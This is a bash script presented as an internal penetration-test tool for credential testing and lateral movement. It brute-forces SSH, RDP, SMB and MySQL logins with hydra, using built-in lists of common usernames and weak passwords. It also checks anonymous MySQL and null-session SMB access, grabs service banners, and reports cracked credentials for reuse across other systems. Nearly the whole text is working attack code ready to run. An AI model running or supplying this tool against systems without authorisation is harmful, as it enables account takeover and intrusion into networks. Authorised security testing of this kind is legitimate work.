#!/bin/bash

# Service Assessment Script
# Lateral Movement Assessment - Internal Penetration Test
# Focus: Credential testing and service exploitation

set -e

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Logging functions
log() { echo -e "${GREEN}[$(date +'%H:%M:%S')]${NC} $1"; }
warn() { echo -e "${YELLOW}[WARNING]${NC} $1"; }
info() { echo -e "${BLUE}[INFO]${NC} $1"; }

# Banner
echo "=========================================="
echo "  Service Assessment Script"
echo "  Credential Testing & Service Analysis"
echo "=========================================="
echo

# Configuration
TARGET_FILE="${1:-./targets.txt}"
USER_FILE="${2:-./users.txt}"
PASS_FILE="${3:-./passwords.txt}"
OUTPUT_DIR="${4:-./service_assessment}"
TIMESTAMP=$(date +'%Y%m%d_%H%M%S')

mkdir -p "$OUTPUT_DIR"

# Check if target file exists
if [ ! -f "$TARGET_FILE" ]; then
    warn "Target file not found. Creating sample target file."
    cat > "$TARGET_FILE" << EOF
# Target list for service assessment
# Format: IP:PORT:SERVICE
192.168.78.10:22:ssh
192.168.78.20:22:ssh
192.168.78.20:3389:rdp
192.168.78.30:3306:mysql
192.168.78.40:445:smb
192.168.78.40:3389:rdp
EOF
    info "Sample target file created: $TARGET_FILE"
fi

# Check if wordlists exist
if [ ! -f "$USER_FILE" ]; then
    warn "User file not found. Creating common service accounts."
    cat > "$USER_FILE" << EOF
# Common service accounts
admin
administrator
root
svc_webapp
svc_app
svc_sql
jsmith
alice
bob
webuser
appuser
dbuser
EOF
fi

if [ ! -f "$PASS_FILE" ]; then
    warn "Password file not found. Creating common passwords."
    cat > "$PASS_FILE" << EOF
# Common passwords
Summer2024!
Welcome123!
DbAdmin123!
Password1
Password123
Admin123!
P@ssw0rd
123456
password
admin
EOF
fi

log "Starting service assessment..."
info "Targets: $TARGET_FILE"
info "Users: $USER_FILE" 
info "Passwords: $PASS_FILE"

# Phase 1: Service-specific testing
log "Phase 1: Service-specific credential testing"

while IFS=: read -r target port service; do
    # Skip comments and empty lines
    [[ "$target" =~ ^# ]] || [ -z "$target" ] && continue
    
    log "Testing $service on $target:$port"
    
    case $service in
        ssh)
            log "SSH credential testing on $target..."
            hydra -L "$USER_FILE" -P "$PASS_FILE" -e nsr -t 4 -o "$OUTPUT_DIR/ssh_creds_${target}_$TIMESTAMP.txt" ssh://"$target" &
            ;;
        rdp)
            log "RDP testing on $target..."
            # Check if RDP is accessible
            if nc -zv -w 2 "$target" 3389 2>/dev/null; then
                hydra -L "$USER_FILE" -P "$PASS_FILE" -t 2 -o "$OUTPUT_DIR/rdp_creds_${target}_$TIMESTAMP.txt" rdp://"$target" &
            else
                warn "RDP not accessible on $target"
            fi
            ;;
        smb)
            log "SMB enumeration on $target..."
            # SMB share enumeration
            smbclient -L "//$target" -N > "$OUTPUT_DIR/smb_shares_${target}_$TIMESTAMP.txt" 2>&1 &
            
            # SMB credential testing
            hydra -L "$USER_FILE" -P "$PASS_FILE" -t 2 -o "$OUTPUT_DIR/smb_creds_${target}_$TIMESTAMP.txt" smb://"$target" &
            ;;
        mysql)
            log "MySQL testing on $target..."
            # MySQL credential testing
            hydra -L "$USER_FILE" -P "$PASS_FILE" -e ns -t 2 -o "$OUTPUT_DIR/mysql_creds_${target}_$TIMESTAMP.txt" mysql://"$target" &
            
            # Anonymous access check
            mysql -h "$target" -u '' -e 'SHOW DATABASES;' > "$OUTPUT_DIR/mysql_anonymous_${target}_$TIMESTAMP.txt" 2>&1 || true
            ;;
        *)
            warn "Unknown service: $service on $target"
            ;;
    esac
    
    # Small delay to avoid overwhelming
    sleep 1
    
done < "$TARGET_FILE"

log "Waiting for background tasks to complete..."
wait

# Phase 2: Success analysis
log "Phase 2: Analyzing results"

SUCCESS_FILE="$OUTPUT_DIR/successful_logins_$TIMESTAMP.txt"
> "$SUCCESS_FILE"

# Parse successful logins
for result_file in "$OUTPUT_DIR"/*creds*"$TIMESTAMP.txt"; do
    if [ -f "$result_file" ] && grep -q "login:" "$result_file"; then
        log "Successful logins found in: $(basename "$result_file")"
        grep "login:" "$result_file" >> "$SUCCESS_FILE"
    fi
done

if [ -s "$SUCCESS_FILE" ]; then
    log "SUCCESSFUL CREDENTIALS FOUND:"
    cat "$SUCCESS_FILE"
else
    warn "No successful credentials found in this assessment"
fi

# Phase 3: Service banner grabbing
log "Phase 3: Service banner collection"

while IFS=: read -r target port service; do
    [[ "$target" =~ ^# ]] || [ -z "$target" ] && continue
    
    log "Grabbing banner from $target:$port ($service)"
    
    case $port in
        22)
            timeout 5 nc -nv "$target" 22 > "$OUTPUT_DIR/banner_ssh_${target}_$TIMESTAMP.txt" 2>&1 || true
            ;;
        80|443|8080|8443)
            timeout 5 curl -I "http://$target:$port" > "$OUTPUT_DIR/http_headers_${target}_$TIMESTAMP.txt" 2>&1 || true
            ;;
        21)
            timeout 5 nc -nv "$target" 21 > "$OUTPUT_DIR/banner_ftp_${target}_$TIMESTAMP.txt" 2>&1 || true
            ;;
        25)
            timeout 5 nc -nv "$target" 25 > "$OUTPUT_DIR/banner_smtp_${target}_$TIMESTAMP.txt" 2>&1 || true
            ;;
    esac
    
done < "$TARGET_FILE"

# Phase 4: Generate assessment report
log "Phase 4: Generating assessment report"

{
    echo "Service Assessment Report"
    echo "========================"
    echo "Date: $(date)"
    echo "Target File: $TARGET_FILE"
    echo "Output Directory: $OUTPUT_DIR"
    echo
    echo "Summary"
    echo "-------"
    
    if [ -s "$SUCCESS_FILE" ]; then
        echo "COMPROMISED CREDENTIALS:"
        echo "======================="
        cat "$SUCCESS_FILE"
        echo
    else
        echo "No credentials compromised in this assessment."
        echo
    fi
    
    echo "Service Analysis"
    echo "---------------"
    for target_file in "$OUTPUT_DIR"/banner_*"$TIMESTAMP.txt"; do
        if [ -f "$target_file" ] && [ -s "$target_file" ]; then
            echo "Banner from $(basename "$target_file"):"
            head -5 "$target_file"
            echo
        fi
    done
    
    echo "Files Generated"
    echo "--------------"
    find "$OUTPUT_DIR" -name "*$TIMESTAMP*" -type f -exec basename {} \;
    
} > "$OUTPUT_DIR/assessment_report_$TIMESTAMP.txt"

log "Service assessment completed"
info "Full report: $OUTPUT_DIR/assessment_report_$TIMESTAMP.txt"
info "Successful logins: $SUCCESS_FILE"

echo
echo "Recommended next actions:"
echo "1. Review successful credentials for lateral movement"
echo "2. Test credential reuse across other systems"
echo "3. Analyze service banners for version-specific vulnerabilities"
